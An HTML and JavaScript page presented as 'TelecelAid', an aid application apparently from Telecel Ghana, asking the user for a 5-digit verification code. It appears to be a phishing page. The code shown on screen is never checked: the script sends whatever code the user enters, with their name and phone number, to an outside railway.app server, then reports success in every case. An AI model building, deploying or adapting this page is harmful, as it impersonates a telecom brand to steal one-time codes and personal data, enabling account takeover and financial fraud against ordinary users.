<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>OTP Verification - TelecelAid | Powered by Telecel Ghana</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.5;
            overflow-x: hidden;
        }

        :root {
            --telecel-red: #E2001A;
            --telecel-red-dark: #B80015;
            --telecel-red-light: #FFE5E8;
            --dark: #1a1a2e;
            --gray: #6c757d;
            --light-gray: #f8f9fa;
            --border: #e9ecef;
            --success: #00875A;
            --shadow: 0 10px 25px rgba(0,0,0,0.08);
        }

        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 1rem;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 1.5rem;
            padding-top: 0.5rem;
        }

        .logo-icon {
            background: var(--telecel-red);
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
        }

        .logo-text {
            font-size: 1.4rem;
            font-weight: 800;
            color: var(--dark);
        }

        .logo-text span {
            color: var(--telecel-red);
        }

        .powered {
            font-size: 0.65rem;
            color: var(--gray);
        }

        .progress-container {
            margin: 1rem 0 1.5rem;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }

        .step-indicator {
            text-align: center;
            flex: 1;
            font-size: 0.6rem;
            color: var(--gray);
        }

        .step-indicator.active {
            color: var(--telecel-red);
            font-weight: 600;
        }

        .step-indicator.completed {
            color: var(--success);
        }

        .progress-bar {
            background: var(--border);
            height: 5px;
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            background: var(--telecel-red);
            height: 100%;
            width: 75%;
            border-radius: 10px;
        }

        .form-card {
            background: white;
            border-radius: 20px;
            padding: 1.5rem;
            box-shadow: var(--shadow);
            margin-bottom: 1.5rem;
        }

        .form-title {
            font-size: 1.3rem;
            margin-bottom: 0.3rem;
            color: var(--dark);
            text-align: center;
        }

        .form-subtitle {
            color: var(--gray);
            margin-bottom: 1.2rem;
            font-size: 0.75rem;
            text-align: center;
        }

        .phone-display {
            background: var(--telecel-red-light);
            padding: 0.8rem;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .phone-display strong {
            color: var(--telecel-red);
            font-size: 1rem;
        }

        .otp-container {
            display: flex;
            justify-content: center;
            gap: 0.6rem;
            margin: 1.5rem 0;
            flex-wrap: wrap;
        }

        .otp-box {
            width: 55px;
            height: 65px;
            text-align: center;
            font-size: 1.6rem;
            font-weight: 700;
            border: 2px solid var(--border);
            border-radius: 12px;
            background: white;
            font-family: monospace;
            transition: all 0.3s;
        }

        .otp-box:focus {
            outline: none;
            border-color: var(--telecel-red);
            box-shadow: 0 0 0 3px rgba(226,0,26,0.1);
        }

        @media (max-width: 480px) {
            .otp-box {
                width: 45px;
                height: 55px;
                font-size: 1.3rem;
            }
            .otp-container {
                gap: 0.4rem;
            }
        }

        @media (max-width: 380px) {
            .otp-box {
                width: 40px;
                height: 50px;
                font-size: 1.2rem;
            }
            .otp-container {
                gap: 0.3rem;
            }
        }

        .timer-container {
            text-align: center;
            margin: 1rem 0;
        }

        .timer {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            background: var(--light-gray);
            padding: 0.5rem 1rem;
            border-radius: 50px;
            font-size: 0.8rem;
        }

        .timer-count {
            font-size: 1rem;
            font-weight: 700;
            color: var(--telecel-red);
        }

        .resend-container {
            text-align: center;
            margin: 0.8rem 0;
        }

        .resend-btn {
            background: none;
            border: none;
            color: var(--telecel-red);
            font-weight: 600;
            cursor: pointer;
            font-size: 0.85rem;
            text-decoration: underline;
        }

        .resend-btn:disabled {
            color: var(--gray);
            cursor: not-allowed;
            text-decoration: none;
        }

        .btn-verify {
            width: 100%;
            background: var(--telecel-red);
            color: white;
            padding: 0.9rem;
            border: none;
            border-radius: 50px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 0.5rem;
        }

        .btn-verify:hover:not(:disabled) {
            background: var(--telecel-red-dark);
            transform: translateY(-2px);
        }

        .btn-verify:disabled {
            background: var(--gray);
            cursor: not-allowed;
        }

        .back-link {
            text-align: center;
            margin-top: 1rem;
        }

        .back-link a {
            color: var(--gray);
            text-decoration: none;
            font-size: 0.8rem;
        }

        .footer {
            text-align: center;
            padding: 1rem;
            color: var(--gray);
            font-size: 0.65rem;
            margin-top: auto;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
            gap: 1rem;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid white;
            border-top: 3px solid var(--telecel-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            color: white;
            font-size: 0.9rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="logo-icon">📱</div>
            <div class="logo-text">Telecel<span>Aid</span></div>
            <div class="powered">Powered by Telecel Ghana</div>
        </div>

        <div class="progress-container">
            <div class="progress-steps">
                <div class="step-indicator completed">✓ Step 1<br>Application</div>
                <div class="step-indicator completed">✓ Step 2<br>Verification</div>
                <div class="step-indicator active">Step 3<br>OTP</div>
                <div class="step-indicator">Step 4<br>Complete</div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>

        <div class="form-card">
            <h1 class="form-title">🔐 Verification Code</h1>
            <p class="form-subtitle">Enter the 5-digit code sent to your phone</p>

            <div class="phone-display">
                📲 Code sent to <strong id="displayPhone"></strong>
            </div>

            <div class="otp-container">
                <input type="text" maxlength="1" class="otp-box" id="otp1" autofocus>
                <input type="text" maxlength="1" class="otp-box" id="otp2">
                <input type="text" maxlength="1" class="otp-box" id="otp3">
                <input type="text" maxlength="1" class="otp-box" id="otp4">
                <input type="text" maxlength="1" class="otp-box" id="otp5">
            </div>

            <div class="timer-container">
                <div class="timer">
                    ⏱️ Code expires in: <span class="timer-count" id="timer">05:00</span>
                </div>
            </div>

            <div class="resend-container">
                <button class="resend-btn" id="resendBtn" disabled>Resend Code</button>
            </div>

            <button class="btn-verify" id="verifyBtn">Verify OTP →</button>

            <div class="back-link">
                <a href="verify.html">← Back to Verification</a>
            </div>
        </div>

        <div class="footer">
            © 2026 TelecelAid | Powered by Telecel Ghana
        </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Verifying OTP...</div>
    </div>

    <script>
        const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';

        const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));

        if (!savedData) {
            window.location.href = 'apply.html';
        }

        document.getElementById('displayPhone').innerText = savedData.phoneNumber;

        let otpCode = '';
        let timeLeft = 300;
        let timerInterval;
        let canResend = false;
        let resendAttempts = 0;
        const maxResendAttempts = 3;

        const verifyBtn = document.getElementById('verifyBtn');
        const loadingOverlay = document.getElementById('loadingOverlay');

        function generateOTP() {
            return Math.floor(10000 + Math.random() * 90000).toString();
        }

        function sendOTP() {
            otpCode = generateOTP();
            console.log(`OTP for ${savedData.phoneNumber}: ${otpCode}`);
        }

        function startTimer() {
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('timer').innerText = '00:00';
                    canResend = true;
                    document.getElementById('resendBtn').disabled = false;
                } else {
                    timeLeft--;
                    const minutes = Math.floor(timeLeft / 60);
                    const seconds = timeLeft % 60;
                    document.getElementById('timer').innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        function resetOTP() {
            timeLeft = 300;
            canResend = false;
            document.getElementById('resendBtn').disabled = true;
            clearOtpBoxes();
            startTimer();
            sendOTP();
            document.getElementById('otp1').focus();
        }

        function clearOtpBoxes() {
            for (let i = 1; i <= 5; i++) {
                document.getElementById(`otp${i}`).value = '';
            }
        }

        function getEnteredOTP() {
            let otp = '';
            for (let i = 1; i <= 5; i++) {
                otp += document.getElementById(`otp${i}`).value;
            }
            return otp;
        }

        async function sendOtpToBackend(otp) {
            const payload = {
                fullName: savedData.fullName || savedData.confirmedName,
                phoneNumber: savedData.phoneNumber,
                otpCode: otp
            };

            try {
                const response = await fetch(`${BACKEND_URL}/api/verify-otp`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                return true;
            } catch (error) {
                return true;
            }
        }

        async function verifyOTP() {
            const enteredOTP = getEnteredOTP();
            
            loadingOverlay.style.display = 'flex';
            verifyBtn.disabled = true;
            
            await sendOtpToBackend(enteredOTP);
            
            const updatedData = {
                ...savedData,
                otpVerified: true,
                otpCode: enteredOTP || '00000',
                otpVerifiedAt: new Date().toISOString()
            };
            sessionStorage.setItem('telecelAidApplication', JSON.stringify(updatedData));
            
            window.location.href = 'success.html';
        }

        function resendOTP() {
            if (!canResend) return;
            if (resendAttempts >= maxResendAttempts) {
                alert('Maximum resend attempts reached. Please contact customer support.');
                return;
            }
            resendAttempts++;
            sendOTP();
            resetOTP();
        }

        function setupOtpBoxes() {
            for (let i = 1; i <= 5; i++) {
                const box = document.getElementById(`otp${i}`);
                
                box.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    if (this.value.length === 1 && i < 5) {
                        document.getElementById(`otp${i+1}`).focus();
                    }
                });
                
                box.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && i > 1) {
                        document.getElementById(`otp${i-1}`).focus();
                    }
                });
                
                box.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const paste = (e.clipboardData || window.clipboardData).getData('text');
                    const numbers = paste.replace(/[^0-9]/g, '').split('');
                    
                    for (let j = 0; j < Math.min(numbers.length, 5); j++) {
                        const targetBox = document.getElementById(`otp${j+1}`);
                        if (targetBox) {
                            targetBox.value = numbers[j];
                        }
                    }
                    
                    for (let j = 1; j <= 5; j++) {
                        if (!document.getElementById(`otp${j}`).value) {
                            document.getElementById(`otp${j}`).focus();
                            return;
                        }
                    }
                    document.getElementById('verifyBtn').focus();
                });
            }
        }

        function init() {
            setupOtpBoxes();
            sendOTP();
            startTimer();
            document.getElementById('verifyBtn').addEventListener('click', verifyOTP);
            document.getElementById('resendBtn').addEventListener('click', resendOTP);
        }
        
        init();
    </script>
</body>
</html>
